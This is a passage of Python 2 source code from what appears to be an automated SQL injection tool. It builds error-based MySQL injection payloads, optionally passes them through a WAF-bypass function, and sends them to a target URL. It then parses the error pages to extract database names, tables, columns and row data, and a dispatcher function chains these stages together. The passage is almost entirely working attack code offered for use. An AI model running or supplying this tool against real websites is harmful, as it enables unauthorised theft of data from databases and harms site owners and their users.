                    i = 0
                else:
                    tmp = str(parserDump(data, 1))
                    tmp = tmp.replace('[', '').replace(']', '').replace("'", '')
                    if (tmp != ''):
                        data_s_list.append(tmp)
                    else:
                        stress = 1

                i += 1
            if (len(data_s_list) > 0):
                print (str(data_s_list))
                return data_s_list

            print colored(" [*] Change syntax ... ", 'cyan')
            stress = 0
            i = 0
            while (stress == 0):
                j = 0
                while (j < len(fields)):
                    nurl = burl
                    if (error_syntax == 1):
                        nurl += "1 OR (SELECT 1984 FROM (SELECT COUNT(*),CONCAT((SELECT CONCAT(0x28,0x5e,0x23,0x5e,0x29,"+str(fields[j])+",0x28,0x56,0x23,0x56,0x29) FROM "+str(dbx)+"."+str(table)+" LIMIT "+str(i)+",1),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) --"
                    elif (error_syntax == 2):
                        nurl += "1 OR (SELECT 1984 FROM (SELECT COUNT(*),CONCAT((SELECT CONCAT(0x28,0x5e,0x23,0x5e,0x29,"+str(fields[j])+",0x28,0x56,0x23,0x56,0x29) FROM "+str(table)+"="+str(dbx)+"."+str(table).encode('hex')+" LIMIT "+str(i)+",1),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) --"
                    elif (error_syntax == 3):
                        nurl += "1 OR (SELECT 1984 FROM (SELECT COUNT(*),CONCAT((SELECT CONCAT(0x28,0x5e,0x23,0x5e,0x29,"+str(fields[j])+",0x28,0x56,0x23,0x56,0x29) FROM "+str(dbx)+"."+str(table)+" LIMIT "+str(i)+",1),FLOOR(RAND(0)*2))x FROM "+str(dbx)+"."+str(table)+" GROUP BY x)a) --"
                        
                    if (waf == 1):
                        nurl = sbws(nurl)
                    #print (nurl)
                    r = requests.get(nurl, headers=headers)
                    data = r.text.encode('utf-8')
                
                    if (data.find("You have an error in your SQL syntax;") > -1 or data.find("Error in SQL Query") > -1 and data.find("(^#^)") == -1):
                        print colored(" [*] Change syntax ... ", 'cyan')
                        error_syntax += 1
                        i = 0
                        
                    else:
                        tmp = str(parserDump(data, 1)) 
                        tmp = tmp.replace('[', '').replace(']', '').replace("'", '')
                        tmp_l += " "
                        tmp_l += tmp

                        j += 1

                if (data.find("(^#^)") == -1):
                    stress = 1
                if (tmp_l != ''):
                    data_s_list.append(tmp_l)
                    tmp_l = ""  
                else:
                    stress = 1

                i += 1
        
            if (len(data_s_list) > 0):
                print (str(data_s_list))
                return data_s_list
            else:
                print colored(" [-] Injection attempt failed ", 'red')
                print colored(" [*] Try Manually (it's more Fun and Education) or use SQLmap (it's eZ')", 'red')
                exit(0)





def     MOCA (url, param, mod, table, fields):
        tmpfile = file
        su = []
        nc = 0
        idx = 0
        modx = 0
        waf = 0

        if (mod == 1):
            IP_PO = ipuser()
            print colored(" [*] Public IP overview: "+IP_PO, 'blue')

            su = stress_url(url, param)
            if (su[1] == 1):
                nc = count_nc(url, param, su[0])
                idx = id_checker(url, param, su[0], nc)
                dumpDatabase(url, param, su[0], su[1], nc, idx)
            elif (su[1] == 2):
                dumpDatabase(url, param, su[0], su[1], 0, 0)
            elif (su[1] == 3):
                nc = heuristic_nc(url, param, su[0])
                idx = id_checker(url, param, su[0], nc)        
                dumpDatabase(url, param, su[0], 1, nc, idx)

        elif (mod == 2):
            tmpfile = open("tmpfile", 'r')
            modx = int(tmpfile.readlines()[0].replace('\n', ''))
            tmpfile.close()
            tmpfile = open("tmpfile", 'r')
            waf = int(tmpfile.readlines()[1].replace('\n', ''))
            tmpfile.close()
            tmpfile = open("tmpfile", 'r')
            nc = int(tmpfile.readlines()[3].replace('\n', ''))
            tmpfile.close()
            tmpfile = open("tmpfile", 'r')
            idx = int(tmpfile.readlines()[4].replace('\n', ''))
            tmpfile.close()
        
            dumpTables(url, param, waf, modx, nc, idx)

        elif (mod == 3):
            tmpfile = open("tmpfile", 'r')
            modx = int(tmpfile.readlines()[0].replace('\n', ''))
            tmpfile.close()
            tmpfile = open("tmpfile", 'r')
            waf = int(tmpfile.readlines()[1].replace('\n', ''))
            tmpfile.close()
            tmpfile = open("tmpfile", 'r')
            nc = int(tmpfile.readlines()[3].replace('\n', ''))
            tmpfile.close()
            tmpfile = open("tmpfile", 'r')
            idx = int(tmpfile.readlines()[4].replace('\n', ''))
            tmpfile.close()
        
            dumpColumns(url, param, waf, modx, nc, idx, table)

        elif (mod == 4):
            tmpfile = open("tmpfile", 'r')
            modx = int(tmpfile.readlines()[0].replace('\n', ''))
            tmpfile.close()
            tmpfile = open("tmpfile", 'r')
            waf = int(tmpfile.readlines()[1].replace('\n', ''))
            tmpfile.close()
            tmpfile = open("tmpfile", 'r')
            nc = int(tmpfile.readlines()[3].replace('\n', ''))
            tmpfile.close()
            tmpfile = open("tmpfile", 'r')
            idx = int(tmpfile.readlines()[4].replace('\n', ''))
            tmpfile.close()
            tmpfile = open("tmpfile", 'r')
            dbx = str(tmpfile.readlines()[2].replace('\n', ''))
            tmpfile.close()
        
            dumpData_s(url, param, waf, modx, nc, idx, table, fields, dbx)







